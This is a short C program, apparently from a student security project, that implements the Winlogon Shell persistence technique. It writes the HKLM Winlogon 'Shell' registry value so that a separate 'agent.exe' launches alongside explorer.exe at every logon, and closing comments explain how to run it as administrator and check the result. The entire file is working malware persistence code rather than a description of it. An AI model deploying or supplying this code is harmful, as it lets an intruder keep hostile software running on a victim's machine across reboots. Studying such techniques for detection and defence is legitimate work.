/* Technique: Winlogon Shell Modification
Privilege Level: Administrator (HKLM)
Description: Appends a malicious executable to the Windows Shell entry.
*/
#include <windows.h>
#include <string.h>

int main() {
    HKEY hkey = NULL;
    // We keep explorer.exe and add our agent, separated by a comma
    const char* shell_value = "explorer.exe,C:\\Users\\abdul\\Downloads\\FYP\\task1\\agent.exe";

    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
    
    if (res == ERROR_SUCCESS) {
        // Overwrite the 'Shell' value
        RegSetValueEx(hkey, "Shell", 0, REG_SZ, (unsigned char*)shell_value, strlen(shell_value));
        RegCloseKey(hkey);
    }
    return 0;
}

// check the registry entry after running
// HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
// open terminal and Run as administrator
// winlogon_shell.exe